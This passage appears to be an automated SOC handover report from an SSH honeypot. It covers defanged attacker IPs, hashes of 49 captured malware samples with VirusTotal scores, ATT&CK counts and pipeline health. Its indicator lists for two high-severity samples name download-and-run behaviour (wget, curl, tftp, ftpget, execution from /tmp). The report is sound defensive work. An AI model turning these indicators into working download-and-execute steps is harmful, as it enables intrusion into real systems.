| `2026-08-19 10:55:04` | `cowrie.session.params` |
| `2026-08-19 10:55:04` | `cowrie.command.input` |
| `2026-08-19 10:55:04` | `cowrie.log.closed` |
| `2026-08-19 10:55:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Monitor for repeat activity from `85.158.145[.]129`
- [ ] No immediate escalation required

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `80.251.153[.]178` | **539** | 2026-08-19 10:55 | 2026-08-19 12:54 | 622m | 0 | `T1592` | 🟠 MEDIUM |
| `101.96.209[.]234` | **26** | 2026-08-19 11:25 | 2026-08-19 12:45 | 46m | 0 | `T1592` | 🟠 MEDIUM |
| `71.193.146[.]100` | **3** | 2026-08-19 11:27 | 2026-08-19 12:00 | 0m | 0 | `T1592` | 🟢 LOW |
| `194.164.107[.]6` | **2** | 2026-08-19 12:15 | 2026-08-19 12:31 | 0m | 0 | `T1592` | 🟢 LOW |
| `92.118.39[.]14` | **2** | 2026-08-19 11:56 | 2026-08-19 12:14 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `107.150.146[.]69` | 1 | 2026-08-19 11:43 | 2026-08-19 11:43 | 36s | 0 | `T1592` | 🟢 LOW |
| `118.145.230[.]7` | 1 | 2026-08-19 12:29 | 2026-08-19 12:30 | 26s | 0 | `T1592` | 🟢 LOW |
| `122.187.228[.]233` | 1 | 2026-08-19 10:55 | 2026-08-19 10:55 | 13s | 0 | `T1592` | 🟢 LOW |
| `140.249.22[.]89` | 1 | 2026-08-19 12:39 | 2026-08-19 12:41 | 120s | 0 | `T1592` | 🟢 LOW |
| `163.177.76[.]85` | 1 | 2026-08-19 12:25 | 2026-08-19 12:25 | 0s | 0 | `T1592` | 🟢 LOW |
| `176.10.203[.]54` | 1 | 2026-08-19 12:42 | 2026-08-19 12:44 | 120s | 0 | `T1592` | 🟢 LOW |
| `200.112.142[.]123` | 1 | 2026-08-19 11:47 | 2026-08-19 11:47 | 10s | 0 | `T1592` | 🟢 LOW |
| `201.140.220[.]172` | 1 | 2026-08-19 11:14 | 2026-08-19 11:14 | 13s | 0 | `T1592` | 🟢 LOW |
| `47.101.137[.]46` | 1 | 2026-08-19 11:00 | 2026-08-19 11:00 | 8s | 0 | `T1592` | 🟢 LOW |
| `49.124.153[.]28` | 1 | 2026-08-19 11:34 | 2026-08-19 11:34 | 0s | 0 | `T1592` | 🟢 LOW |
| `64.62.156[.]192` | 1 | 2026-08-19 12:54 | 2026-08-19 12:54 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]203` | 1 | 2026-08-19 11:50 | 2026-08-19 11:51 | 15s | 0 | `T1592` | 🟢 LOW |
| `79.136.140[.]53` | 1 | 2026-08-19 11:07 | 2026-08-19 11:08 | 11s | 0 | `T1592` | 🟢 LOW |
| `85.165.104[.]58` | 1 | 2026-08-19 10:56 | 2026-08-19 10:56 | 30s | 0 | `T1592` | 🟢 LOW |
| `88.214.25[.]123` | 1 | 2026-08-19 12:06 | 2026-08-19 12:06 | 0s | 0 | `T1592` | 🟢 LOW |
| `91.233.83[.]203` | 1 | 2026-08-19 12:54 | 2026-08-19 12:54 | 0s | 0 | `T1592` | 🟢 LOW |
| `93.158.90[.]221` | 1 | 2026-08-19 11:01 | 2026-08-19 11:01 | 0s | 0 | `T1592` | 🟢 LOW |
| `93.158.90[.]231` | 1 | 2026-08-19 11:01 | 2026-08-19 11:01 | 0s | 0 | `T1592` | 🟢 LOW |
| `93.158.90[.]254` | 1 | 2026-08-19 11:01 | 2026-08-19 11:01 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0cd01e621dce7d42e6d6db50ef3e16170e3b737586863ec600826c7b0d3ed423` | Unknown binary | `0cd01e621dce7d42...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 81/100 | 🔴 HIGH | **28/75** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 69/100 | 🟡 MEDIUM | **24/75** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `27d205dc183ea2fad0e55e10b206404be20908e39a74569ff99182d7326ed9c0` | ELF Binary (Linux executable) (x86-64 64-bit) | `27d205dc183ea2fa...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `287962211de7bcadb39f7576732438b43ee6aab420ec23c29a9d12a8151a547f` | ELF Binary (Linux executable) (x86 32-bit) | `287962211de7bcad...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `2f206563640dd66a743ffd493ce0e3c31a8fc5a24b9f5d2b540fc22d45c13d66` | ELF Binary (Linux executable) (x86 32-bit) | `2f206563640dd66a...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `124.67.120[.]106` | CN | China Unicom Neimeng Province Network | **100** ⚠️ | 50 |
| `116.228.195[.]251` | CN | Yi Cheng Transport Service Co., Ltd. Shanghai set canning | **100** ⚠️ | 50 |
| `91.233.83[.]203` | GB | Andrew Millar Ltd | **100** ⚠️ | 10 |
| `106.245.246[.]26` | KR | LG Uplus | **100** ⚠️ | 50 |
| `62.183.82[.]70` | RU | OJSC Rostelecom Macroregional Branch South | **100** ⚠️ | 50 |
| `182.76.71[.]82` | IN | YAJNA TECHNOLOGIS PVT. LT | **100** ⚠️ | 50 |
| `118.145.230[.]7` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 7 |
| `66.132.172[.]203` | US | Censys, Inc. | **100** ⚠️ | 50 |
| `219.144.16[.]16` | CN | CHINANET shanxi(SN) province network | **100** ⚠️ | 50 |
| `201.140.220[.]172` | BR | BRASIL TECPAR | AMIGO | AVATO | **100** ⚠️ | 6 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 131 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 123 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 28 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 26 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 25 |

---

## 🔕 False Positive Summary (19 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 4 |
| AbuseIPDB score 13 below threshold 25 | 2 |
| AbuseIPDB score 2 below threshold 25 | 1 |
| AbuseIPDB score 5 below threshold 25 | 4 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 8 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 734 cases |
| Tool 34  | Credential Extractor        | ✅ 144 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 10 fingerprints |
| Tool 36  | Command Clustering          | ✅ 10 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 85 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 19 filtered (2.6%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 64 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 20 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 124 priority case(s) shown individually · 24 recon entry/entries in table (5 group(s) consolidating 572 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-08-19T14:38:39Z_
